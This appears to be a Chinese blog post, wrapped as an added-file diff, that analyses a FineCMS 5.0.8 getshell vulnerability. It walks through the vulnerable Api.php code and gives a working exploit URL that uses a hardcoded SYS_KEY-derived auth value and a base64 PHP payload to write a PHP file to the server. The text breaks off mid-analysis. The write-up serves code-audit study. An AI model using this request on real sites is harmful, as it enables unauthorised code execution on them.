@@ -1,0 +1,723 @@
+<!DOCTYPE html>
+<html>
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>FineCMS最新版5.0.8两处getshell(每天一洞) - F0rmat&#39;Blog</title>
+<link rel="stylesheet" type="text/css" href="/css/main.css">
+</head>
+<body>
+<header>
+  <div>
+    <h1><a href="https://getshe11.com/">F0rmat&#39;Blog</a></h1>
+  </div>
+  <nav></nav>
+</header>
+<main>
+  <article>
+    <div class="title">
+  <h1>FineCMS最新版5.0.8两处getshell(每天一洞)</h1>
+  </div>
+<div style="position: fixed; right:-30px; max-width:300px; overflow:auto; top: 1px; width: 300px; bottom:100px">
+<div class="container text-center mt-3">
+    <iframe src="https://duckduckgo.com/search.html?site=https://getshe11.com/&prefill=" style="overflow:hidden;margin:0;padding:0;max-width:80%;height:40px;" frameborder="0"></iframe>
+</div>
+</div>
+<div class="meta">
+  <div>2018-01-30 00:06</div>
+  <div>
+    <span><a href="https://getshe11.com/tags/finecms/">#FineCMS</a></span>
+      <span><a href="https://getshe11.com/tags/getshell/">#getshell</a></span>
+      </div>
+  </div>
+<div class="content">
+  <h2 id="前言">前言</h2>
+<p>要专心学习代码审计了，看看能不能坚持每天去分析一个漏洞，我会去按照大神们分析的代码去读懂代码逻辑然后再写上自己的理解放在我的博客上面。在文章的末尾我会贴上文章的链接，尊重原作者的版权！</p>
+<h2 id="第一处漏洞分析">第一处漏洞分析</h2>
+<h3 id="漏洞文件位置和代码">漏洞文件位置和代码</h3>
+<p><strong>代码位置：\finecms\dayrui\controllers\Api.php</strong></p>
+<!-- raw HTML omitted -->
+<p><strong>核心代码：</strong></p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-php" data-lang="php"><span style="color:#66d9ef">public</span> <span style="color:#66d9ef">function</span> <span style="color:#a6e22e">data2</span>() {
+
+        $data <span style="color:#f92672">=</span> <span style="color:#66d9ef">array</span>();
+
+        <span style="color:#75715e">// 来路认证
+</span><span style="color:#75715e"></span>        <span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">defined</span>(<span style="color:#e6db74">&#39;SYS_REFERER&#39;</span>) <span style="color:#f92672">&amp;&amp;</span> <span style="color:#a6e22e">strlen</span>(<span style="color:#a6e22e">SYS_REFERER</span>)) {
+            $http <span style="color:#f92672">=</span> $_SERVER[<span style="color:#e6db74">&#39;HTTP_REFERER&#39;</span>] <span style="color:#f92672">?</span> $_SERVER[<span style="color:#e6db74">&#39;HTTP_REFERER&#39;</span>] <span style="color:#f92672">:</span> $_GET[<span style="color:#e6db74">&#39;http_referer&#39;</span>];
+            <span style="color:#66d9ef">if</span> (<span style="color:#66d9ef">empty</span>($http)) {
+                $data <span style="color:#f92672">=</span> <span style="color:#66d9ef">array</span>(<span style="color:#e6db74">&#39;msg&#39;</span> <span style="color:#f92672">=&gt;</span> <span style="color:#e6db74">&#39;来路认证失败（NULL）&#39;</span>, <span style="color:#e6db74">&#39;code&#39;</span> <span style="color:#f92672">=&gt;</span> <span style="color:#ae81ff">0</span>);
+            } <span style="color:#66d9ef">elseif</span> (<span style="color:#a6e22e">strpos</span>($http, <span style="color:#a6e22e">SYS_REFERER</span>) <span style="color:#f92672">===</span> <span style="color:#66d9ef">FALSE</span>) {
+                $data <span style="color:#f92672">=</span> <span style="color:#66d9ef">array</span>(<span style="color:#e6db74">&#39;msg&#39;</span> <span style="color:#f92672">=&gt;</span> <span style="color:#e6db74">&#39;来路认证失败（非法请求）&#39;</span>, <span style="color:#e6db74">&#39;code&#39;</span> <span style="color:#f92672">=&gt;</span> <span style="color:#ae81ff">0</span>);
+            }
+        }
+        <span style="color:#75715e">//如果data为空就继续
+</span><span style="color:#75715e"></span>        <span style="color:#66d9ef">if</span> (<span style="color:#f92672">!</span>$data) {
+            <span style="color:#75715e">// 安全码认证
+</span><span style="color:#75715e"></span>            <span style="color:#75715e">//从get接收auth的参数
+</span><span style="color:#75715e"></span>            $auth <span style="color:#f92672">=</span> $this<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">input</span><span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">get</span>(<span style="color:#e6db74">&#39;auth&#39;</span>);
+            <span style="color:#75715e">//SYS_KEY的值为24b16fede9a67c9251d3e7c7161c83ac，如果auth不等于md5加密后的SYS_KEY就执行
+</span><span style="color:#75715e"></span>            <span style="color:#66d9ef">if</span> ($auth <span style="color:#f92672">!=</span> <span style="color:#a6e22e">md5</span>(<span style="color:#a6e22e">SYS_KEY</span>)) {
+                <span style="color:#75715e">// 授权认证码不正确
+</span><span style="color:#75715e"></span>                $data <span style="color:#f92672">=</span> <span style="color:#66d9ef">array</span>(<span style="color:#e6db74">&#39;msg&#39;</span> <span style="color:#f92672">=&gt;</span> <span style="color:#e6db74">&#39;授权认证码不正确&#39;</span>, <span style="color:#e6db74">&#39;code&#39;</span> <span style="color:#f92672">=&gt;</span> <span style="color:#ae81ff">0</span>);
+            } <span style="color:#66d9ef">else</span> {
+                <span style="color:#75715e">// 解析数据
+</span><span style="color:#75715e"></span>                $cache <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;&#39;</span>;
+                <span style="color:#75715e">//从get里面取param参数的值
+</span><span style="color:#75715e"></span>                $param <span style="color:#f92672">=</span> $this<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">input</span><span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">get</span>(<span style="color:#e6db74">&#39;param&#39;</span>);
+                <span style="color:#75715e">//判断是否有param[&#39;cache&#39;]这个参数并且这个参数不能为空
+</span><span style="color:#75715e"></span>                <span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">isset</span>($param[<span style="color:#e6db74">&#39;cache&#39;</span>]) <span style="color:#f92672">&amp;&amp;</span> $param[<span style="color:#e6db74">&#39;cache&#39;</span>]) {
+                    $cache <span style="color:#f92672">=</span> <span style="color:#a6e22e">md5</span>(<span style="color:#a6e22e">dr_array2string</span>($param));
+                    $data <span style="color:#f92672">=</span> $this<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">get_cache_data</span>($cache);
+                }
+                <span style="color:#66d9ef">if</span> (<span style="color:#f92672">!</span>$data) {
+
+                    <span style="color:#66d9ef">if</span> ($param <span style="color:#f92672">==</span> <span style="color:#e6db74">&#39;login&#39;</span>) {
+                        <span style="color:#75715e">// 登录认证
+</span><span style="color:#75715e"></span>                        $code <span style="color:#f92672">=</span> $this<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">member_model</span><span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">login</span>(
+                            $this<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">input</span><span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">get</span>(<span style="color:#e6db74">&#39;username&#39;</span>),
+                            $this<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">input</span><span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">get</span>(<span style="color:#e6db74">&#39;password&#39;</span>),
+                            <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">1</span>);
+                        <span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">is_array</span>($code)) {
+                            $data <span style="color:#f92672">=</span> <span style="color:#66d9ef">array</span>(
+                                <span style="color:#e6db74">&#39;msg&#39;</span> <span style="color:#f92672">=&gt;</span> <span style="color:#e6db74">&#39;ok&#39;</span>,
+                                <span style="color:#e6db74">&#39;code&#39;</span> <span style="color:#f92672">=&gt;</span> <span style="color:#ae81ff">1</span>,
+                                <span style="color:#e6db74">&#39;return&#39;</span> <span style="color:#f92672">=&gt;</span> $this<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">member_model</span><span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">get_member</span>($code[<span style="color:#e6db74">&#39;uid&#39;</span>])
+                            );
+                        } <span style="color:#66d9ef">elseif</span> ($code <span style="color:#f92672">==</span> <span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>) {
+                            $data <span style="color:#f92672">=</span> <span style="color:#66d9ef">array</span>(<span style="color:#e6db74">&#39;msg&#39;</span> <span style="color:#f92672">=&gt;</span> <span style="color:#a6e22e">fc_lang</span>(<span style="color:#e6db74">&#39;会员不存在&#39;</span>), <span style="color:#e6db74">&#39;code&#39;</span> <span style="color:#f92672">=&gt;</span> <span style="color:#ae81ff">0</span>);
+                        } <span style="color:#66d9ef">elseif</span> ($code <span style="color:#f92672">==</span> <span style="color:#f92672">-</span><span style="color:#ae81ff">2</span>) {
+                            $data <span style="color:#f92672">=</span> <span style="color:#66d9ef">array</span>(<span style="color:#e6db74">&#39;msg&#39;</span> <span style="color:#f92672">=&gt;</span> <span style="color:#a6e22e">fc_lang</span>(<span style="color:#e6db74">&#39;密码不正确&#39;</span>), <span style="color:#e6db74">&#39;code&#39;</span> <span style="color:#f92672">=&gt;</span> <span style="color:#ae81ff">0</span>);
+                        } <span style="color:#66d9ef">elseif</span> ($code <span style="color:#f92672">==</span> <span style="color:#f92672">-</span><span style="color:#ae81ff">3</span>) {
+                            $data <span style="color:#f92672">=</span> <span style="color:#66d9ef">array</span>(<span style="color:#e6db74">&#39;msg&#39;</span> <span style="color:#f92672">=&gt;</span> <span style="color:#a6e22e">fc_lang</span>(<span style="color:#e6db74">&#39;Ucenter注册失败&#39;</span>), <span style="color:#e6db74">&#39;code&#39;</span> <span style="color:#f92672">=&gt;</span> <span style="color:#ae81ff">0</span>);
+                        } <span style="color:#66d9ef">elseif</span> ($code <span style="color:#f92672">==</span> <span style="color:#f92672">-</span><span style="color:#ae81ff">4</span>) {
+                            $data <span style="color:#f92672">=</span> <span style="color:#66d9ef">array</span>(<span style="color:#e6db74">&#39;msg&#39;</span> <span style="color:#f92672">=&gt;</span> <span style="color:#a6e22e">fc_lang</span>(<span style="color:#e6db74">&#39;Ucenter：会员名称不合法&#39;</span>), <span style="color:#e6db74">&#39;code&#39;</span> <span style="color:#f92672">=&gt;</span> <span style="color:#ae81ff">0</span>);
+                        }
+                    } <span style="color:#66d9ef">elseif</span> ($param <span style="color:#f92672">==</span> <span style="color:#e6db74">&#39;update_avatar&#39;</span>) {
+                        <span style="color:#75715e">// 更新头像
+</span><span style="color:#75715e"></span>                        $uid <span style="color:#f92672">=</span> (<span style="color:#a6e22e">int</span>)$_REQUEST[<span style="color:#e6db74">&#39;uid&#39;</span>];<span style="color:#75715e">//获取uid，但下面没有检测所以不用加上&amp;uid的值
+</span><span style="color:#75715e"></span>                        $file <span style="color:#f92672">=</span> $_REQUEST[<span style="color:#e6db74">&#39;file&#39;</span>];<span style="color:#75715e">//接收文件的参数
+</span><span style="color:#75715e"></span>                        <span style="color:#75715e">// 创建图片存储文件夹
+</span><span style="color:#75715e"></span>                        $dir <span style="color:#f92672">=</span> <span style="color:#a6e22e">SYS_UPLOAD_PATH</span><span style="color:#f92672">.</span><span style="color:#e6db74">&#39;/member/&#39;</span><span style="color:#f92672">.</span>$uid<span style="color:#f92672">.</span><span style="color:#e6db74">&#39;/&#39;</span>;
+                        <span style="color:#f92672">@</span><span style="color:#a6e22e">dr_dir_delete</span>($dir);<span style="color:#75715e">//删除目录下的全部文件
+</span><span style="color:#75715e"></span>                        <span style="color:#66d9ef">if</span> (<span style="color:#f92672">!</span><span style="color:#a6e22e">is_dir</span>($dir)) {<span style="color:#75715e">//判断是否是目录
+</span><span style="color:#75715e"></span>                            <span style="color:#a6e22e">dr_mkdirs</span>($dir);<span style="color:#75715e">//新建目录再给权限
+</span><span style="color:#75715e"></span>                        }
+                        <span style="color:#75715e">//把里面的空格替换成+
+</span><span style="color:#75715e"></span>                        $file <span style="color:#f92672">=</span> <span style="color:#a6e22e">str_replace</span>(<span style="color:#e6db74">&#39; &#39;</span>, <span style="color:#e6db74">&#39;+&#39;</span>, $file);
+                        <span style="color:#75715e">/*）^表示要以下面的表达式开头，*表示匹配前面的子表达式零次或多次，/接着特殊字符
+</span><span style="color:#75715e">
+</span><span style="color:#75715e">                        匹配字样为data:image/后缀;base64,
+</span><span style="color:#75715e">                        */</span>
+                        <span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">preg_match</span>(<span style="color:#e6db74">&#39;/^(data:\s*image\/(\w+);base64,)/&#39;</span>, $file, $result)){
+                            $new_file <span style="color:#f92672">=</span> $dir<span style="color:#f92672">.</span><span style="color:#e6db74">&#39;0x0.&#39;</span><span style="color:#f92672">.</span>$result[<span style="color:#ae81ff">2</span>];
+                            <span style="color:#66d9ef">if</span> (<span style="color:#f92672">!@</span><span style="color:#a6e22e">file_put_contents</span>($new_file, <span style="color:#a6e22e">base64_decode</span>(<span style="color:#a6e22e">str_replace</span>($result[<span style="color:#ae81ff">1</span>], <span style="color:#e6db74">&#39;&#39;</span>, $file)))) {
+                                $data <span style="color:#f92672">=</span> <span style="color:#66d9ef">array</span>(
+                                    <span style="color:#e6db74">&#39;msg&#39;</span> <span style="color:#f92672">=&gt;</span> <span style="color:#e6db74">&#39;目录权限不足或磁盘已满&#39;</span>,
+                                    <span style="color:#e6db74">&#39;code&#39;</span> <span style="color:#f92672">=&gt;</span> <span style="color:#ae81ff">0</span>
+                                );
+                            } <span style="color:#66d9ef">else</span> {
+                                $this<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">load</span><span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">library</span>(<span style="color:#e6db74">&#39;image_lib&#39;</span>);
+                                $config[<span style="color:#e6db74">&#39;create_thumb&#39;</span>] <span style="color:#f92672">=</span> <span style="color:#66d9ef">TRUE</span>;
+                                $config[<span style="color:#e6db74">&#39;thumb_marker&#39;</span>] <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;&#39;</span>;
+                                $config[<span style="color:#e6db74">&#39;maintain_ratio&#39;</span>] <span style="color:#f92672">=</span> <span style="color:#66d9ef">FALSE</span>;
+                                $config[<span style="color:#e6db74">&#39;source_image&#39;</span>] <span style="color:#f92672">=</span> $new_file;
+                                <span style="color:#66d9ef">foreach</span> (<span style="color:#66d9ef">array</span>(<span style="color:#ae81ff">30</span>, <span style="color:#ae81ff">45</span>, <span style="color:#ae81ff">90</span>, <span style="color:#ae81ff">180</span>) <span style="color:#66d9ef">as</span> $a) {
+                                    $config[<span style="color:#e6db74">&#39;width&#39;</span>] <span style="color:#f92672">=</span> $config[<span style="color:#e6db74">&#39;height&#39;</span>] <span style="color:#f92672">=</span> $a;
+                                    $config[<span style="color:#e6db74">&#39;new_image&#39;</span>] <span style="color:#f92672">=</span> $dir<span style="color:#f92672">.</span>$a<span style="color:#f92672">.</span><span style="color:#e6db74">&#39;x&#39;</span><span style="color:#f92672">.</span>$a<span style="color:#f92672">.</span><span style="color:#e6db74">&#39;.&#39;</span><span style="color:#f92672">.</span>$result[<span style="color:#ae81ff">2</span>];
+                                    $this<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">image_lib</span><span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">initialize</span>($config);
+                                    <span style="color:#66d9ef">if</span> (<span style="color:#f92672">!</span>$this<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">image_lib</span><span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">resize</span>()) {
+                                        $data <span style="color:#f92672">=</span> <span style="color:#66d9ef">array</span>(
+                                            <span style="color:#e6db74">&#39;msg&#39;</span> <span style="color:#f92672">=&gt;</span> $this<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">image_lib</span><span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">display_errors</span>(),
+                                            <span style="color:#e6db74">&#39;code&#39;</span> <span style="color:#f92672">=&gt;</span> <span style="color:#ae81ff">0</span>
+                                        );
+                                        <span style="color:#66d9ef">break</span>;
+                                    }
+                                }
+                                <span style="color:#66d9ef">list</span>($width, $height, $type, $attr) <span style="color:#f92672">=</span> <span style="color:#a6e22e">getimagesize</span>($dir<span style="color:#f92672">.</span><span style="color:#e6db74">&#39;45x45.&#39;</span><span style="color:#f92672">.</span>$result[<span style="color:#ae81ff">2</span>]);
+                                <span style="color:#66d9ef">if</span> (<span style="color:#f92672">!</span>$type) {
+                                    $data <span style="color:#f92672">=</span> <span style="color:#66d9ef">array</span>(
+                                        <span style="color:#e6db74">&#39;msg&#39;</span> <span style="color:#f92672">=&gt;</span> <span style="color:#e6db74">&#39;错误的文件格式，请传输图片的字符&#39;</span>,
+                                        <span style="color:#e6db74">&#39;code&#39;</span> <span style="color:#f92672">=&gt;</span> <span style="color:#ae81ff">0</span>
+                                    );
+                                }
+                            }
+                        } <span style="color:#66d9ef">else</span> {
+                            $data <span style="color:#f92672">=</span> <span style="color:#66d9ef">array</span>(
+                                <span style="color:#e6db74">&#39;msg&#39;</span> <span style="color:#f92672">=&gt;</span> <span style="color:#e6db74">&#39;图片字符串不规范，请使用base64格式&#39;</span>,
+                                <span style="color:#e6db74">&#39;code&#39;</span> <span style="color:#f92672">=&gt;</span> <span style="color:#ae81ff">0</span>
+                            );
+                        }
+
+                        <span style="color:#75715e">// 更新头像
+</span><span style="color:#75715e"></span>                        <span style="color:#66d9ef">if</span> (<span style="color:#f92672">!</span><span style="color:#a6e22e">isset</span>($data[<span style="color:#e6db74">&#39;code&#39;</span>])){
+                            $data <span style="color:#f92672">=</span> <span style="color:#66d9ef">array</span>(
+                                <span style="color:#e6db74">&#39;code&#39;</span> <span style="color:#f92672">=&gt;</span> <span style="color:#ae81ff">1</span>,
+                                <span style="color:#e6db74">&#39;msg&#39;</span> <span style="color:#f92672">=&gt;</span> <span style="color:#e6db74">&#39;更新成功&#39;</span>
+                            );
+                            $this<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">db</span><span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">where</span>(<span style="color:#e6db74">&#39;uid&#39;</span>, $uid)<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">update</span>(<span style="color:#e6db74">&#39;member&#39;</span>, <span style="color:#66d9ef">array</span>(<span style="color:#e6db74">&#39;avatar&#39;</span> <span style="color:#f92672">=&gt;</span> $uid));
+                        }
+                    } <span style="color:#66d9ef">elseif</span> ($param <span style="color:#f92672">==</span> <span style="color:#e6db74">&#39;function&#39;</span>) {
+                        <span style="color:#75715e">// 执行函数
+</span><span style="color:#75715e"></span>                        $name <span style="color:#f92672">=</span> $this<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">input</span><span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">get</span>(<span style="color:#e6db74">&#39;name&#39;</span>, <span style="color:#66d9ef">true</span>);
+                        <span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">function_exists</span>($name)) {
+                            $_param <span style="color:#f92672">=</span> <span style="color:#66d9ef">array</span>();
+                            $_getall <span style="color:#f92672">=</span> $this<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">input</span><span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">get</span>(<span style="color:#66d9ef">null</span>, <span style="color:#66d9ef">true</span>);
+                            <span style="color:#66d9ef">if</span> ($_getall) {
+                                <span style="color:#66d9ef">for</span> ($i<span style="color:#f92672">=</span><span style="color:#ae81ff">1</span>; $i<span style="color:#f92672">&lt;=</span><span style="color:#ae81ff">10</span>; $i<span style="color:#f92672">++</span>) {
+                                    <span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">isset</span>($_getall[<span style="color:#e6db74">&#39;p&#39;</span><span style="color:#f92672">.</span>$i])) {
+                                        $_param[] <span style="color:#f92672">=</span> $_getall[<span style="color:#e6db74">&#39;p&#39;</span><span style="color:#f92672">.</span>$i];
+                                    } <span style="color:#66d9ef">else</span> {
+                                        <span style="color:#66d9ef">break</span>;
+                                    }
+                                }
+                            }
+                            $data <span style="color:#f92672">=</span> <span style="color:#66d9ef">array</span>(<span style="color:#e6db74">&#39;msg&#39;</span> <span style="color:#f92672">=&gt;</span> <span style="color:#e6db74">&#39;&#39;</span>, <span style="color:#e6db74">&#39;code&#39;</span> <span style="color:#f92672">=&gt;</span> <span style="color:#ae81ff">1</span>, <span style="color:#e6db74">&#39;result&#39;</span> <span style="color:#f92672">=&gt;</span> <span style="color:#a6e22e">call_user_func_array</span>($name, $_param));
+                        } <span style="color:#66d9ef">else</span> {
+                            $data <span style="color:#f92672">=</span> <span style="color:#66d9ef">array</span>(<span style="color:#e6db74">&#39;msg&#39;</span> <span style="color:#f92672">=&gt;</span> <span style="color:#e6db74">&#39;函数 （&#39;</span><span style="color:#f92672">.</span>$name<span style="color:#f92672">.</span><span style="color:#e6db74">&#39;）不存在&#39;</span>, <span style="color:#e6db74">&#39;code&#39;</span> <span style="color:#f92672">=&gt;</span> <span style="color:#ae81ff">0</span>);
+                        }
+                    } <span style="color:#66d9ef">elseif</span> ($param <span style="color:#f92672">==</span> <span style="color:#e6db74">&#39;get_file&#39;</span>) {
+                        <span style="color:#75715e">// 获取文件地址
+</span><span style="color:#75715e"></span>                        $info <span style="color:#f92672">=</span> <span style="color:#a6e22e">get_attachment</span>((<span style="color:#a6e22e">int</span>)$this<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">input</span><span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">get</span>(<span style="color:#e6db74">&#39;id&#39;</span>));
+                        <span style="color:#66d9ef">if</span> (<span style="color:#f92672">!</span>$info) {
+                            $data <span style="color:#f92672">=</span> <span style="color:#66d9ef">array</span>(<span style="color:#e6db74">&#39;msg&#39;</span> <span style="color:#f92672">=&gt;</span> <span style="color:#a6e22e">fc_lang</span>(<span style="color:#e6db74">&#39;附件不存在或者已经被删除&#39;</span>), <span style="color:#e6db74">&#39;code&#39;</span> <span style="color:#f92672">=&gt;</span> <span style="color:#ae81ff">0</span>, <span style="color:#e6db74">&#39;url&#39;</span> <span style="color:#f92672">=&gt;</span> <span style="color:#e6db74">&#39;&#39;</span>);
+                        } <span style="color:#66d9ef">else</span> {
+                            $data <span style="color:#f92672">=</span> <span style="color:#66d9ef">array</span>(<span style="color:#e6db74">&#39;msg&#39;</span> <span style="color:#f92672">=&gt;</span> <span style="color:#e6db74">&#39;&#39;</span>, <span style="color:#e6db74">&#39;code&#39;</span> <span style="color:#f92672">=&gt;</span> <span style="color:#ae81ff">1</span>, <span style="color:#e6db74">&#39;url&#39;</span> <span style="color:#f92672">=&gt;</span> <span style="color:#a6e22e">dr_get_file</span>($info[<span style="color:#e6db74">&#39;attachment&#39;</span>]));
+                        }
+                    } <span style="color:#66d9ef">else</span> {
+                        <span style="color:#75715e">// list数据查询
+</span><span style="color:#75715e"></span>                        $data <span style="color:#f92672">=</span> $this<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">template</span><span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">list_tag</span>($param);
+                        $data[<span style="color:#e6db74">&#39;code&#39;</span>] <span style="color:#f92672">=</span> $data[<span style="color:#e6db74">&#39;error&#39;</span>] <span style="color:#f92672">?</span> <span style="color:#ae81ff">0</span> <span style="color:#f92672">:</span> <span style="color:#ae81ff">1</span>;
+                        <span style="color:#a6e22e">unset</span>($data[<span style="color:#e6db74">&#39;sql&#39;</span>], $data[<span style="color:#e6db74">&#39;pages&#39;</span>]);
+                    }
+
+                    <span style="color:#75715e">// 缓存数据
+</span><span style="color:#75715e"></span>                    $cache <span style="color:#f92672">&amp;&amp;</span> $this<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">set_cache_data</span>($cache, $data, $param[<span style="color:#e6db74">&#39;cache&#39;</span>]);
+                }
+            }
+        }
+
+		<span style="color:#75715e">// 接收参数
+</span><span style="color:#75715e"></span>		$format <span style="color:#f92672">=</span> $this<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">input</span><span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">get</span>(<span style="color:#e6db74">&#39;format&#39;</span>);
+		$function <span style="color:#f92672">=</span> $this<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">input</span><span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">get</span>(<span style="color:#e6db74">&#39;function&#39;</span>);
+        <span style="color:#66d9ef">if</span> ($function) {
+            <span style="color:#66d9ef">if</span> (<span style="color:#f92672">!</span><span style="color:#a6e22e">function_exists</span>($function)) {
+                $data <span style="color:#f92672">=</span> <span style="color:#66d9ef">array</span>(<span style="color:#e6db74">&#39;msg&#39;</span> <span style="color:#f92672">=&gt;</span> <span style="color:#a6e22e">fc_lang</span>(<span style="color:#e6db74">&#39;自定义函数&#39;</span><span style="color:#f92672">.</span>$function<span style="color:#f92672">.</span><span style="color:#e6db74">&#39;不存在&#39;</span>), <span style="color:#e6db74">&#39;code&#39;</span> <span style="color:#f92672">=&gt;</span> <span style="color:#ae81ff">0</span>);
+            } <span style="color:#66d9ef">else</span> {
+                $data <span style="color:#f92672">=</span> $function($data);
+            }
+        }
+		<span style="color:#75715e">// 页面输出
+</span><span style="color:#75715e"></span>		<span style="color:#66d9ef">if</span> ($format <span style="color:#f92672">==</span> <span style="color:#e6db74">&#39;php&#39;</span>) {
+			<span style="color:#a6e22e">print_r</span>($data);
+		} <span style="color:#66d9ef">elseif</span> ($format <span style="color:#f92672">==</span> <span style="color:#e6db74">&#39;jsonp&#39;</span>) {
+			<span style="color:#75715e">// 自定义返回名称
+</span><span style="color:#75715e"></span>			<span style="color:#66d9ef">echo</span> $this<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">input</span><span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">get</span>(<span style="color:#e6db74">&#39;callback&#39;</span>, <span style="color:#66d9ef">TRUE</span>)<span style="color:#f92672">.</span><span style="color:#e6db74">&#39;(&#39;</span><span style="color:#f92672">.</span>$this<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">callback_json</span>($data)<span style="color:#f92672">.</span><span style="color:#e6db74">&#39;)&#39;</span>;
+		} <span style="color:#66d9ef">else</span> {
+			<span style="color:#75715e">// 自定义返回名称
+</span><span style="color:#75715e"></span>			<span style="color:#66d9ef">echo</span> $this<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">callback_json</span>($data);
+		}
+		<span style="color:#66d9ef">exit</span>;
+	}
+</code></pre></div><h3 id="执行结果">执行结果</h3>
+<p>我分析漏洞，都是看实现的Payload是什么，再从这个Payload再反推过来，思路就很清晰了，要不然慢慢去看代码，有些代码是不必要的，会浪费很多时间。
+<strong>结果图：</strong>
+​
+<img src="https://pic-1252849007.cos.ap-guangzhou.myqcloud.com/finecms_data2.png" alt="漏洞"></p>
+<p><strong>执行代码：</strong>
+<code>http://127.0.0.1/index.php?c=api&amp;m=data2&amp;auth=50ce0d2401ce4802751739552c8e4467&amp;param=update_avatar&amp;file=data:image/php;base64,PD9waHAgcGhwaW5mbygpOz8+</code></p>
+<h3 id="分析过程">分析过程</h3>
+<p><strong>这一段代码主要是看<code>$data = array();</code>这一句就行了</strong></p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-php" data-lang="php">$data <span style="color:#f92672">=</span> <span style="color:#66d9ef">array</span>();
+
+        <span style="color:#75715e">// 来路认证
+</span><span style="color:#75715e"></span>        <span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">defined</span>(<span style="color:#e6db74">&#39;SYS_REFERER&#39;</span>) <span style="color:#f92672">&amp;&amp;</span> <span style="color:#a6e22e">strlen</span>(<span style="color:#a6e22e">SYS_REFERER</span>)) {
+            $http <span style="color:#f92672">=</span> $_SERVER[<span style="color:#e6db74">&#39;HTTP_REFERER&#39;</span>] <span style="color:#f92672">?</span> $_SERVER[<span style="color:#e6db74">&#39;HTTP_REFERER&#39;</span>] <span style="color:#f92672">:</span> $_GET[<span style="color:#e6db74">&#39;http_referer&#39;</span>];
+            <span style="color:#66d9ef">if</span> (<span style="color:#66d9ef">empty</span>($http)) {
+                $data <span style="color:#f92672">=</span> <span style="color:#66d9ef">array</span>(<span style="color:#e6db74">&#39;msg&#39;</span> <span style="color:#f92672">=&gt;</span> <span style="color:#e6db74">&#39;来路认证失败（NULL）&#39;</span>, <span style="color:#e6db74">&#39;code&#39;</span> <span style="color:#f92672">=&gt;</span> <span style="color:#ae81ff">0</span>);
+            } <span style="color:#66d9ef">elseif</span> (<span style="color:#a6e22e">strpos</span>($http, <span style="color:#a6e22e">SYS_REFERER</span>) <span style="color:#f92672">===</span> <span style="color:#66d9ef">FALSE</span>) {
+                $data <span style="color:#f92672">=</span> <span style="color:#66d9ef">array</span>(<span style="color:#e6db74">&#39;msg&#39;</span> <span style="color:#f92672">=&gt;</span> <span style="color:#e6db74">&#39;来路认证失败（非法请求）&#39;</span>, <span style="color:#e6db74">&#39;code&#39;</span> <span style="color:#f92672">=&gt;</span> <span style="color:#ae81ff">0</span>);
+            }
+        }
+</code></pre></div><p>这一段接着上面的如果是空就继续，再下来就是安全码认证了。从<code>get</code>取得<code>auth</code>的内容，然后去判断<code>auth</code>的内容是否正确，我们可以用<code>PHPStorm</code>选中<code>SYS_KEY</code>，按着<code>shift+ctrl+F</code>来查找<code>SYS_KEY</code>的位置，和notepad++的查找代码的差不多。
+<img src="https://pic-1252849007.cos.ap-guangzhou.myqcloud.com/find_in_path.png" alt="">
+可以看到<code>SYS_KEY</code>是一个固定的值：24b16fede9a67c9251d3e7c7161c83ac，按上面的逻辑判断<code>auth</code>如果不等于<code>auth</code>的MD5加密就报错，那我们用MD5加密<code>SYS_KEY</code>就可以了。
+加密后得到
+auth=50ce0d2401ce4802751739552c8e4467</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-php" data-lang="php">        <span style="color:#75715e">//如果data为空就继续
